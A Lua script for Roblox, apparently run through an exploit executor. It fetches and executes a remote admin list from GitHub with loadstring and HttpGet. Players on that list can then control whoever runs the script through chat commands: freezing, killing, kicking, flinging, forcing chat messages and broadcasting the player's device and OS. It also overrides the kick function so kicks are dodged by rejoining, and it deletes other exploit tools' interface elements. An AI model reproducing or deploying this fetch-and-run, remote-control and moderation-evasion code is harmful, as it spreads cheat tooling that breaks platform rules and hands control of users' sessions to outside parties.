local AdminList = loadstring(game:HttpGet("https://raw.githubusercontent.com/JustSomeGuest/Scripts/main/Universal/PlayerController/Admins.lua"))()

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local GuiService = game:GetService("GuiService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local UserInputService = game:GetService("UserInputService")

local cmd = {commands = {}}
local conn = {connections = {}}
local var = {variables = {}}

function conn.new(name, event, callback)
    conn.connections[name] = event:Connect(callback)
    return conn.connections[name]
end

function conn.remove(name)
    if conn.connections[name] then
        conn.connections[name]:Disconnect()
        conn.connections[name] = nil
    end
end

function var.new(name, value)
    var.variables[name] = value
    return var.variables[name]
end

function var.get(name)
    return var.variables[name]
end

function var.set(name, value)
    var.variables[name] = value
end

var.new("originalWalkSpeed", 16)
var.new("originalJumpPower", 50)
var.new("rejoinLockActive", false)
var.new("originalKick", nil)
var.new("isOrbiting", false)
var.new("isSpinning", false)
var.new("currentSpinSpeed", 0)

function cmd.new(name, func, expectsArgs, expectsAdmin)
    cmd.commands[name] = {func = func, expectsArgs = expectsArgs or false, expectsAdmin = expectsAdmin or false}
end

local function GetDevice()
    local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
    local isConsole = UserInputService.GamepadEnabled and not UserInputService.MouseEnabled and not UserInputService.TouchEnabled
    local isPC = UserInputService.MouseEnabled or not isMobile
    
    if isMobile then
        return "Mobile"
    elseif isConsole then
        return "Console"
    else
        return "PC"
    end
end

local function GetOS()
    local platform = UserInputService:GetPlatform()
    if platform == Enum.Platform.Windows then
        return "Windows"
    elseif platform == Enum.Platform.OSX then
        return "macOS"
    elseif platform == Enum.Platform.IOS then
        return "iOS"
    elseif platform == Enum.Platform.Android then
        return "Android"
    elseif platform == Enum.Platform.XBoxOne then
        return "Xbox"
    elseif platform == Enum.Platform.PlayStation then
        return "PlayStation"
    end
    return "Unknown"
end

cmd.new("getdevice", function()
    TextChatService.TextChannels.RBXGeneral:SendAsync("Player Device: " .. GetDevice())
end)

cmd.new("getos", function()
    TextChatService.TextChannels.RBXGeneral:SendAsync("Player OS: " .. GetOS())
end)

cmd.new("freeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        var.set("originalWalkSpeed", humanoid.WalkSpeed)
        var.set("originalJumpPower", humanoid.JumpPower)
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    if Player.Character then
        for _, part in pairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
    end
end)

cmd.new("unfreeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = var.get("originalWalkSpeed")
        humanoid.JumpPower = var.get("originalJumpPower")
    end
    if Player.Character then
        for _, part in pairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
    end
end)

cmd.new("walkspeed", function(args)
    local speed = tonumber(args[1])
    if speed then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = speed
        end
    end
end, true)

cmd.new("jumppower", function(args)
    local power = tonumber(args[1])
    if power then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.JumpPower = power
        end
    end
end, true)

cmd.new("fling", function()
    local root = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if root then
        local direction = Vector3.new(math.random(-100, 100), math.random(50, 200), math.random(-100, 100))
        root.Velocity = direction
    end
end)

cmd.new("kill", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
    end
end)

cmd.new("void", function()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if root then
        root.CFrame = CFrame.new(0, -500, 0)
    end
end)

cmd.new("sit", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Sit = true
    end
end)

cmd.new("orbit", function(admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not adminRoot or not localRoot then return end
    
    if var.get("isOrbiting") then
        cmd.commands["unorbit"].func()
    end
    
    var.set("isOrbiting", true)
    local angle = 0
    local radius = 5
    local speed = 2
    
    local orbitConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isOrbiting") or not adminRoot or not localRoot then
            cmd.commands["unorbit"].func()
            return
        end
        angle = angle + speed * RunService.RenderStepped:Wait()
        local offset = CFrame.new(adminRoot.Position) * CFrame.Angles(0, angle, 0) * CFrame.new(radius, 0, 0)
        localRoot.CFrame = offset
    end)
    conn.new("orbit", orbitConnection, function() end)
end, false, true)

cmd.new("unorbit", function()
    var.set("isOrbiting", false)
    conn.remove("orbit")
end)

cmd.new("spin", function(args)
    local speedNum = tonumber(args[1]) or 5
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    if var.get("isSpinning") then
        cmd.commands["unspin"].func()
    end
    
    var.set("isSpinning", true)
    var.set("currentSpinSpeed", speedNum)
    local angle = 0
    
    local spinConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isSpinning") or not hrp then
            cmd.commands["unspin"].func()
            return
        end
        angle = angle + var.get("currentSpinSpeed") * RunService.RenderStepped:Wait()
        local newCFrame = hrp.CFrame * CFrame.Angles(0, math.rad(angle), 0)
        hrp.CFrame = newCFrame
    end)
    conn.new("spin", spinConnection, function() end)
end, true)

cmd.new("unspin", function()
    var.set("isSpinning", false)
    conn.remove("spin")
end)

cmd.new("dance1", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.RigType == Enum.HumanoidRigType.R15 then
        TextChatService.TextChannels.RBXGeneral:SendAsync("/e dance")
    else
        TextChatService.TextChannels.RBXGeneral:SendAsync("/e dance1")
    end
end)

cmd.new("dance2", function()
    TextChatService.TextChannels.RBXGeneral:SendAsync("/e dance2")
end)

cmd.new("dance3", function()
    TextChatService.TextChannels.RBXGeneral:SendAsync("/e dance3")
end)

cmd.new("kick", function(args)
    local reason = table.concat(args, " ")
    Player:Kick(reason or "Kicked by admin")
end, true)

cmd.new("bring", function(admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if adminRoot and localRoot then
        localRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
    end
end, false, true)

cmd.new("chat", function(args)
    local msg = table.concat(args, " ")
    TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
end, true)

local function Rejoin()
    local placeId = game.PlaceId
    local jobId = game.JobId
    TeleportService:TeleportToPlaceInstance(placeId, jobId, Player)
end

cmd.new("rejoinlock", function()
    var.set("rejoinLockActive", true)
    
    local success = pcall(function()
        if Player.Kick then
            var.set("originalKick", Player.Kick)
            Player.Kick = function(self, msg)
                if var.get("rejoinLockActive") then
                    task.wait(0.5)
                    Rejoin()
                end
                return nil
            end
        end
    end)
    
    if not success then
        task.wait(0.5)
        Rejoin()
        return
    end
    
    conn.remove("escape_menu")
    local menuConnection = GuiService.MenuOpened:Connect(function()
        if var.get("rejoinLockActive") then
            task.wait(0.1)
            Rejoin()
        end
    end)
    conn.new("escape_menu", menuConnection, function() end)
end)

cmd.new("unrejoinlock", function()
    var.set("rejoinLockActive", false)
    if var.get("originalKick") then
        Player.Kick = var.get("originalKick")
        var.set("originalKick", nil)
    end
    conn.remove("escape_menu")
end)

cmd.new("delexec", function()
    local whitelistedContainers = {
        ["RobloxGui"] = true, ["PlayerList"] = true, ["ExperienceChat"] = true,
        ["BubbleChat"] = true, ["DevConsole"] = true, ["SocialService"] = true,
        ["PerformanceStats"] = true, ["ScreenShotTool"] = true, ["EmotesMenu"] = true,
        ["CallDialogScreen"] = true, ["CaptureManager"] = true, ["CaptureOverlay"] = true,
        ["Composer"] = true, ["ContactList"] = true, ["Chat"] = true,
        ["HeadsetDisconnectedDialog"] = true, ["InExperienceInterventionApp"] = true,
        ["PlayerMenuScreen"] = true, ["PurchasePromptApp"] = true, ["RobloxPromptGui"] = true,
        ["ScreenshotsCarousel"] = true, ["TeleportEffectGui"] = true, ["TopBarApp"] = true,
        ["ControlGui"] = true, ["VehicleGui"] = true, ["NotificationGui"] = true,
        ["DescendantProtector"] = true, ["AppUpdaterGui"] = true, ["FaceTrackingGui"] = true,
        ["ExperienceNotificationGui"] = true, ["VoiceChatGui"] = true, ["SafetyCheckGui"] = true,
        ["ToastGui"] = true, ["InGameMenuV2"] = true, ["RightClickMenu"] = true,
        ["VoiceChatPromptGui"] = true, ["BottomBarGui"] = true, ["GuiService"] = true,
        ["FullscreenTitleBar"] = true, ["TextureView"] = true, ["ChromeGui"] = true,
        ["BlockingApp"] = true, ["HealthGui"] = true, ["StutterDetector"] = true,
        ["AvatarContextMenuItem"] = true
    }
    
    local function getTopLevelContainer(obj)
        local current = obj
        while current.Parent and current.Parent ~= CoreGui and current.Parent ~= game do
            current = current.Parent
        end
        return current
    end
    
    local function isJumbled(name)
        if string.match(name, "[^%w%s%-%.]") then return true end
        if #name > 30 then return true end
        local upperCount = #string.gsub(name, "[^A-Z]", "")
        local lowerCount = #string.gsub(name, "[^a-z]", "")
        local totalLetters = upperCount + lowerCount
        if totalLetters > 5 then
            if string.match(name, "%u%u%u") then return true end
            local _, vowelCount = string.gsub(name:lower(), "[aeiouy]", "")
            if vowelCount == 0 or (vowelCount / totalLetters) < 0.15 then return true end
            if upperCount > 1 and lowerCount > 1 and string.match(name, "%l%u%l") then return true end
        end
        return false
    end
    
    for _, obj in ipairs(CoreGui:GetDescendants()) do
        local topContainer = getTopLevelContainer(obj)
        if topContainer and whitelistedContainers[topContainer.Name] then
            continue
        end
        if isJumbled(obj.Name) then
            pcall(function() obj:Destroy() end)
        end
    end
end)

local function ProcessCommand(admin, cmdName, args)
    local command = cmd.commands[cmdName]
    if command then
        if command.expectsArgs and #args == 0 then return end
        if command.expectsAdmin then
            command.func(admin, args)
        elseif command.expectsArgs then
            command.func(args)
        else
            command.func()
        end
    end
end

local function OnChatted(plr, msg)
    if not table.find(AdminList, plr.Name) then return end
    
    local commandMsg = msg
    if string.sub(msg, 1, 1) == "/" and string.sub(msg, 2, 2) == "e" then
        commandMsg = string.sub(msg, 4)
    elseif string.sub(msg, 1, 1) ~= "!" then
        return
    end
    
    local parts = {}
    for part in string.gmatch(commandMsg, "%S+") do
        table.insert(parts, part)
    end
    if #parts > 0 then
        local cmdName = string.lower(string.sub(parts[1], 2))
        local args = {table.unpack(parts, 2)}
        ProcessCommand(plr, cmdName, args)
    end
end

for _, plr in pairs(Players:GetPlayers()) do
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) OnChatted(plr, msg) end)
end

conn.new("player_added", Players.PlayerAdded, function(plr)
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) OnChatted(plr, msg) end)
end)
